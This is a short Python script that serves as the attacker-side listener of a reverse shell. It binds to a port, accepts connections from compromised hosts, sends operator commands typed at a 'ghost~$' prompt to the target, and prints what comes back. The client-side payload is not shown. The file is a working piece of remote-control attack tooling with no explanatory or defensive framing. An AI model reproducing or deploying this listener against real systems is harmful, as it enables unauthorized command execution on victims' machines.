import sys
import socket

host = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0' #server IP
port = int(sys.argv[2] if len (sys.argv) > 2 else 5555) # port we're tunneling data into

#create a socket object, waits for incoming connection
server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((host, port)) #bind to server address
server.listen(5)

#loop used as a shell
while True:
	print('Listening on', host, ':', port)
	client = server.accept() #accept the successful connection
	print(f'[STATUS] Connection opened {client[1]}')
	client[0].send('Reverse shell connection.'.encode())
	while True:

		cmd = input('ghost~$ ')
		client[0].send(cmd.encode()) #send command to target

		#allow user to quit
		quit = ['q', 'quit', 'x', 'exit']
		if cmd.lower() in quit:
			break

		#get the result of the command from the client 
		result = client[0].recv(1024).decode()
		print(result)

	client[0].close()
	cmd = input('Wait for a new connection? y/n: ') or 'y'
	if cmd.lower() in ['n', 'no']:
		break

server.close()
# https://pymotw.com/2/threading/
